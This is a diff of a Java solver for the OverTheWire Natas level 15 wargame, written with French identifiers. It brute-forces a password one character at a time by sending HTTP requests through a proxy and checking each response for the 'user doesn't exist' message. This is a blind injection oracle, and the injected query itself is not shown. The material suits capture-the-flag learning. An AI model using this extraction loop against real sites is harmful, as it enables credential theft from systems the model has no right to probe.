@@ -18,12 +18,17 @@ public class Natas {
 	public static void main(String[] args) throws Exception {
 
 		StringBuilder password = new StringBuilder();
+		int longueurInit = -1;
 
-		for (char charac : caracteres.toCharArray()) {
-			if (envoyerRequete(password.toString() + charac)) {
-				password.append(charac);
-				break;
+		while (longueurInit != password.length()) {
+			longueurInit = password.length();
+			for (char charac : caracteres.toCharArray()) {
+				if (envoyerRequete(password.toString() + charac)) {
+					password.append(charac);
+					break;
+				}
 			}
+			System.out.println(password.toString());
 		}
 
 		System.out.println(password.toString());
@@ -32,7 +37,7 @@ public class Natas {
 	static boolean envoyerRequete(String param) throws IOException {
 
 		HttpURLConnection connection = null;
-		Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(<censored>));
+		Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("", 0));
 		URL url = new URL("http://natas15.natas.labs.overthewire.org/index.php?debug");
 		connection = (HttpURLConnection) url.openConnection(proxy);
 		connection.setRequestMethod("POST");
@@ -56,7 +61,6 @@ public class Natas {
 			response.append(line);
 			response.append('\r');
 		}
-		// System.out.println(response.toString());
 
 		rd.close();
 		return !response.toString().contains("This user doesn't exist");
